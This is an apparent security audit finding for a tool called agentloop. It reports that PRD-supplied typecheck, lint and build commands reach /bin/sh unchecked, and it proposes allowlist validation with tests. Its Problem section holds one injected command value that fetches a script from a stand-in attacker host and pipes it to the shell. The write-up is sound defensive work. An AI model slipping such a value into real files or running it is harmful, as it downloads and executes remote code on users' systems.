# Finding 02: PRD Validation Commands Are Shell Injection Vectors

**Severity**: CRITICAL
**Consensus**: 3/6 reviewers
**Files**: `agentloop/src/prd/schemas.ts:61-65`, `agentloop/src/validator/validator.ts:133`, `agentloop/src/utils/shell.ts`

## Problem

`typecheckCommand`, `lintCommand`, and `buildCommand` are arbitrary strings from the PRD file (user-controlled input). They are passed directly to `/bin/sh -c` via `runShellCommand()`. A PRD containing `typecheckCommand: "tsc; curl evil.com | sh"` executes both commands.

## Recommendation

Validate PRD commands at load time against an allowlist of known-safe tool prefixes. Reject commands containing shell chaining operators.

## Implementation Plan

1. Add `validatePrdCommand()` to `utils/shell.ts` — checks that command starts with a known-safe binary and contains no chaining metacharacters (`;`, `&&`, `||`, `|`, `$()`, backticks)
2. Call `validatePrdCommand()` in the PRD loader after Zod parse
3. Add tests for malicious PRD command strings
